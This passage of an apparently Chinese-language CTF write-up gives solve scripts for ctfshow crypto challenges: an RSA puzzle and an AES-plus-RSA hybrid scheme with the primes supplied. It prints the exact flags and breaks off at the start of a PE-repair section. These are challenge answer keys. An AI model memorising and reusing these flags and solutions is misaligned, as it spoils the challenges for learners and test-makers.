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" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phic=euler_phi(c)</span><br><span class="line"></span><br><span class="line">print(gcd(e,phic))</span><br><span class="line"></span><br><span class="line">dc=invert(e,phic)</span><br><span class="line"></span><br><span class="line">a=pow(hint,dc,c)</span><br><span class="line"></span><br><span class="line">n=int(a)+int(c)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><p>flag为ctfshow{Oh_u_knOw_4uler}</p><h2 id="5-混合密码体系"><a href="#5-混合密码体系" class="headerlink" title="5 混合密码体系"></a><strong>5 混合密码体系</strong></h2><p>混合密码体系</p><p>AES加密明文，RSA加密AES的密钥</p><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">from Crypto.Util.number import bytes_to_long,getPrime</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line"></span><br><span class="line"># 对称加密</span><br><span class="line">flag = b&#x27;ctfshow&#123;***&#125;&#x27;      # 密文，隐藏</span><br><span class="line">key = b&#x27;flag&#123;***&#125;&#x27;      # 会话密钥，隐藏</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;       # AES偏移向量，已知</span><br><span class="line"># 对明文进行填充，使其长度符合AES加密的要求</span><br><span class="line">padded_plaintext = pad(flag, AES.block_size)</span><br><span class="line"></span><br><span class="line"># 创建AES加密对象</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># 加密</span><br><span class="line">ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line"></span><br><span class="line"># 加密后的文本通常是字节串，转成整数便于进行会话密钥的RSA加密</span><br><span class="line">c1 = bytes_to_long(ciphertext)</span><br><span class="line"></span><br><span class="line">print(f&#x27;c1 = &#123;c1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 非对称加密</span><br><span class="line">m = bytes_to_long(key)</span><br><span class="line">e = 0x10001</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">print(f&#x27;q = &#123;q&#125;&#x27;)</span><br><span class="line">print(f&#x27;n = &#123;n&#125;&#x27;)</span><br><span class="line">print(f&#x27;c2 = &#123;c&#125;&#x27;)</span><br><span class="line"># print(&quot;hint:key需要转成字节流也就是b&#x27;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">e = 0x10001</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 非对称解密</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = pow(c2, d, n)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(m)</span><br><span class="line">print(key) # flag&#123;**********&#125;</span><br><span class="line"># 对称解密</span><br><span class="line">ciphertext = long_to_bytes(c1)</span><br><span class="line"></span><br><span class="line"># 创建AES解密对象</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># 解密</span><br><span class="line">plaintext_padded = cipher.decrypt(ciphertext)</span><br><span class="line">print(plaintext_padded)</span><br><span class="line"></span><br><span class="line"># 去除填充,没有这一步也能得到flag</span><br><span class="line">flag = unpad(plaintext_padded, AES.block_size)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag</p><p>ctfshow{Hybrid_password_system_is_chaos}</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h3><p>非预期：打开IDA</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240708171017813.png" alt="image-20240708171017813"><br>不过都考PE修复了，学一学</p><p>：<a 